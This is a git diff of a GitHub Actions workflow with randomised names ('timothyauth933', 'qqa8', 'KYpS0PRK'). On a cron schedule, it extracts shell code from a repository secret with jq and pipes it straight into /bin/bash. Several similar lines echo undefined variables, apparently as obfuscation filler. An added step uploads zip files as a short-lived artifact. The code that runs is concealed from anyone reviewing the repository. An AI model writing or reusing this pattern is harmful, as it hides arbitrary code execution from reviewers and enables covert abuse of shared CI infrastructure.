@@ -1,30 +1,29 @@
 name: timothyauth933
-
 on:
   workflow_dispatch:
-  schedule:
-    - cron: '17 0/6 * * *'
 
+  schedule:
+    - cron: '28 5,11,17,23 * * *'
 jobs:
   build:
     runs-on: ubuntu-latest
-
     steps:
       - uses: actions/checkout@v4
       - name: timothyauth933
         env:
-          h4956: ${{ secrets.h4956 }}
+          qqa8: ${{ secrets.qqa8 }}
         run: |
-          echo $h4956 | jq -r .zfzzp712 | /bin/bash
-          echo $nwzll60727 | jq -r .ocj6109 | /bin/bash
-          echo $ohwe91248 | jq -r .f00 | /bin/bash
-          echo $fvbq4884 | jq -r .k14980 | /bin/bash
-          echo $e0510 | jq -r .cuw8 | /bin/bash
-          echo $zmk26464 | jq -r .nrj0 | /bin/bash
-          echo $t9 | jq -r .m4381 | /bin/bash
-          echo $hcevv01 | jq -r .mj3 | /bin/bash
-          echo $h55417 | jq -r .rsvh0374 | /bin/bash
-          echo $qnn8 | jq -r .mo526 | /bin/bash
-          echo $cwt39 | jq -r .ex8 | /bin/bash
-          echo $rr0168 | jq -r .ou49184 | /bin/bash
+          printf '%s' "$qqa8" | jq -r .x48860 | /bin/bash
+          echo $wmwg0583 | jq -r .drt91 | /bin/bash
+          echo $pt9 | jq -r .ypg5041 | /bin/bash
+          echo $lhv92421 | jq -r .amqtj0004 | /bin/bash
+          echo $pp2302 | jq -r .itept14036 | /bin/bash
+          echo $qnds330 | jq -r .okyx53 | /bin/bash
+          echo $dlmhp05626 | jq -r .tpk55 | /bin/bash
 
+      - name: Upload artifact
+        uses: actions/upload-artifact@v4
+        with:
+          name: KYpS0PRK
+          path: "*.zip"
+          retention-days: 1
